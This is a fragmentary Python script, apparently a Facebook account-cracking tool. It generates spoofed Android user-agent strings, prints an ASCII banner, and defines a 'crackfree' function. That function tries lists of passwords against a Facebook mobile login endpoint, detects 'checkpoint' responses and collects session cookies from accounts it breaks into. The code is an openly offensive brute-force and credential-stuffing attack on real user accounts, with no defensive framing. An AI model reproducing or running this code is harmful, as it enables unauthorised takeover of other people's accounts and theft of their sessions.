...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19'
	...
	k='Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19'
...
\t     _ \ |         __     __                ______ _              
\t      |__|______ |    \ | __ \________  . |   ____ _/
\t      |'.| `/ \`\|`'_  \| :   \  / \  \      \_____
\t      |__) / _ \ | | | /|, .' /_ /  \  \_ |    -   _/
\t|_______/[_|    \'|;__/[|____/|_/___]'. \__| ___   /
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://x.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1662991386536%26e2e%3D%257B%2522init%2522%253A1662991386537%257D%26sso%3Dchrome_custom_tab%26state%3D%257B%25220_auth_logger_id%2522%253A%2522c67034f6-2156-4ab4-8dd9-6c6adb9d833d%2522%252C%25227_challenge%2522%253A%2522hsdev2bitmf3k6r1q0q2%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instagram.android%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc67034f6-2156-4ab4-8dd9-6c6adb9d833d%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instagram.android%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522c67034f6-2156-4ab4-8dd9-6c6adb9d833d%2522%252C%25227_challenge%2522%253A%2522hsdev2bitmf3k6r1q0q2%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&zero_e=3&zero_et=1665017695&_rdc=1&_rdr')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"SupportsFresco=1 Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
